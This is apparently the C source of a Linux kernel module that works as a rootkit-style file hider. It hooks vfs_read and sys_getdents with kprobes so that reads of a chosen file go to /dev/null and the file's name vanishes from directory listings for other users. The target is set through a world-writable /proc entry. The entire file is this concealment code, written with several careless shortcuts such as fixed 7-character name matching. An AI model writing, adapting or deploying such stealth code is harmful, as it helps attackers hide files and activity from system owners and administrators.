#include "file_hiding.h" 

MODULE_LICENSE("GPL");

char file_to_hide[1000];
char *temp_file_path = NULL;
uid_t original_user;


char *get_file_name_from_path(char *path){
	char *position, *last_candidate;
	position = path;
	last_candidate = path;
	while (true){
		if (position[0] == '/'){ last_candidate = position+1;}
		if (position[0] == 0) { break; }
		position++;
	}
	return last_candidate;
}

// callee responsible for freeing memory
char *get_path_up_to_file_name(char *path){
	char *position, *last_candidate;
	int len;
	position = path;
	last_candidate = path;
	while (true){
		if (position[0] == '/'){ last_candidate = position+1;}
		if (position[0] == 0) { break; }
		position++;
	}
	len = last_candidate - path;
	memset(temp_file_path, 0, 4096);
	memcpy(temp_file_path, path, (len < 4095) ? len : 4095);
	if (len > 0)
		temp_file_path[len-1] = 0;
	return temp_file_path;
}


//ssize_t vfs_read(struct file*, char __user*, size_t, loff_t);
static int handler_pre_vfs_read(struct kprobe *p, struct pt_regs *regs){
	if (!strcmp(file_to_hide, "nothing") || (current_uid().val == original_user)) return 0;
	#ifdef CONFIG_X86
	struct file *file, *name_overwrite;
	struct dentry *den, *den_replace;
	const char *name, *name_replace;
	file = (struct file*) regs->di;
	den = (struct dentry*)file->f_path.dentry;
	name = (char*) den->d_name.name;
	if (file_to_hide != NULL && memcmp(name, get_file_name_from_path(file_to_hide), 7) == 0){
		name_overwrite = filp_open("/dev/null",O_RDWR, S_IWUSR | S_IRUSR);
		regs->di = (unsigned long)name_overwrite;	
		den_replace = ((struct file*)regs->di)->f_path.dentry;
		name_replace  = den->d_name.name;
		printk(KERN_INFO "Caught %s and replaced with %s", get_file_name_from_path(file_to_hide), name_replace);
	}
	#endif
	return 0;
}

struct linux_dirent d;
int should_bypass;
unsigned long d_name_ptr;
//unsigned long d_off;
char fpath[256];

static int handler_sys_getdents(struct kprobe *p, struct pt_regs *regs){
	if (!strcmp(file_to_hide, "nothing") || (current_uid().val == original_user)) return 0;
	struct dentry *den;
	const char *name;
	int ret;
	unsigned int fd = (unsigned int) regs->di;
	struct linux_dirent __user *dirent = (struct linux_dirent __user*) regs->si;
	unsigned int count = (unsigned int) regs->dx;
	struct file *f = fdget(fd).file;
	if (!f) return 0;
	den = (struct dentry*) f->f_path.dentry;
	if (!den){
		printk(KERN_INFO "no den");
		return 0;
	}
	memset(fpath, 0, 256);
	char * pth = dentry_path_raw(den, fpath, 256);
	if (!strcmp(pth, get_path_up_to_file_name(file_to_hide))){
		should_bypass = 1;
		d_name_ptr = (unsigned long)(unsigned char*)dirent->d_name;
	}else{
		should_bypass = 0;
	}
	return 0;
}

static int ret_handler_sys_getdents(struct kretprobe_instance *ri, struct pt_regs *regs){
	if (!strcmp(file_to_hide, "nothing") || (current_uid().val == original_user)) return 0;
	if (should_bypass){
		char *dname = (char*) d_name_ptr;
		int len = regs->ax;
		char *n = kzalloc(len, GFP_KERNEL);
		copy_from_user(n, (char*) dname, len);
		int i=0;
		for (i=0; i<len-1; i++){
			if (!strncmp(n+i, get_file_name_from_path(file_to_hide), 7)){
				printk(KERN_INFO "FOUND: %s %d", n+i, strnlen(n+i, 200));
				copy_to_user((char*) dname+i, "\0\0\0\0", 2);
			}
		}
		kfree(n);
	}
	return 0;
}

ssize_t hider_write_file(struct file* file, const char __user *buf, size_t count, loff_t* data){
	memset(file_to_hide, 0, 1000);
	copy_from_user(file_to_hide, buf, count);
	printk(KERN_INFO "Got path from user: %s", file_to_hide);
	original_user = current_uid().val;
	return count;
}


static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr){
	printk(KERN_INFO "fault_handler: p->addr=0x%p,msr=0x%lx",p->addr, regs->flags);
	return 0;
}


int init_module(void){
	int ret;

	temp_file_path = kzalloc(4096, GFP_KERNEL);
	printk(KERN_INFO "Starting up...");
	ret = 0;
	ret = register_kprobe(&kp_read);
	if (ret < 0){
		printk(KERN_INFO "Failed to kprobe at %d\n", ret);
		return ret;
	}
	ret = register_kprobe(&kp_getdents);
	if (ret < 0){
		printk(KERN_INFO "Failed to kretprobe at %d\n", ret);
		unregister_kprobe(&kp_read);
		return ret;
	}
	kret_sys_getdents.kp.symbol_name = "sys_getdents";
	ret = register_kretprobe(&kret_sys_getdents);
	if (ret < 0){
		printk(KERN_INFO "Failed to kretprobe at %d\n", ret);
		unregister_kprobe(&kp_read);
		unregister_kprobe(&kp_getdents);
		return ret;
	}
	hider_entry = proc_create("hider", 0666, NULL, &hider_ops);

	strcpy(file_to_hide, "nothing");
	return 0;
}

void cleanup_module(void){
	printk(KERN_INFO "Closing down...");
	unregister_kprobe(&kp_read);
	unregister_kprobe(&kp_getdents);
	unregister_kretprobe(&kret_sys_getdents);
	proc_remove(hider_entry);
	if (temp_file_path != NULL){
		kfree(temp_file_path);
	}
}
